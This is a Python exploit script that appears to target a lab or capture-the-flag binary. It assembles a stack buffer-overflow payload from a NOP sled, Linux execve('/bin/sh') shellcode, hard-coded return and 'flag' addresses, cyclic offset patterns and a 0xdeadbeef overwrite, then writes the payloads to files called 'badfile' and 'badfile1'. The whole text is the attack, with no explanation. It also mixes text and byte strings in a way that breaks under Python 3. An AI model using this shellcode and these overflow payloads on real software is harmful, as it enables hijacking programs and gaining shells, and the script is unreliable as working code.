import os
import struct

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
nopsled = (b"\x90")
#indirizzi
ret = 0x0a
vuln = 0x8049192
flag = 0x804921e
string = 0x804c060
target = string + 40
padding = 128-24



payload = "AAA%AAsAABabc"
payload += nopsled*91
payload += shellcode
payload += struct.pack("I", string)
payload += "A" * 8
payload += struct.pack("I", vuln)
payload += "AAA%AAsAABabcAAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH"
payload += struct.pack("I", flag)



payload1  = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5"
payload1 += "\xef\xbe\xad\xde"
f = open("badfile", "a")
f.write("%s" % payload)
f.close()

print(len(payload))

f = open("badfile1", "a")
f.write("%s" % payload1)
f.close()

